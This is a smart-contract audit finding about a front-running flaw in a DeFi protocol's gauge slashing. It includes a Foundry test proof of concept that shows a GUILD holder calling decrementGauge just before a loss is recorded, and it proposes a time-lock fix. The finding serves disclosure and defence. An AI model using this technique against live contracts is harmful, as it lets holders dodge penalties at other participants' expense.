# Vulnerability details

## Vulnerability details

A MEV monitoring the mempool for `notifyLoss` trx can evade slashing (`applyGaugeLoss`) of its `GUILD` tokens by  placing a `decrementGauge` trx call just before the loss gets recorded.

## Impact
This allows opportunistic GUILD holders to always participate in reward distribution, but escape being penalized for their contribution to a badly structured gauge(term).

## Proof of Concept
A POC added to `ERC20RebaseDistributor.t.sol`

```solidity
// This is the original function defined in GuildToken.t.sol test  file

function _setupAliceLossInGauge1() internal {
       .....

        // roll to next block
        vm.warp(block.timestamp + 13);
        vm.roll(block.number + 1);

        // Escape slashing
        vm.prank(alice);  // <---- Get out before slashing
        token.decrementGauge(gauge1, 40e18);  // <---- Get out before slashing

        // loss in gauge 1
        profitManager.notifyPnL(gauge1, -100);
    }

function testEvadeNotifyLoss() public {
        // mints alice 100 tokens, puts 40 in gauge1 and exits just before slashing
        _setupAliceLossInGauge1();

        // cannot penalize, because alice got out in time
        vm.expectRevert();
        token.applyGaugeLoss(gauge1, alice);
    }
```

## Tools Used
Foundry, Manual review

## Recommended Mitigation Steps
Consider adding a time-locking mechanism, that prevents GUILD holders to take out their tokens immediately after calling `decrementGauge` . This would prevent bots from front-running the slashing trx


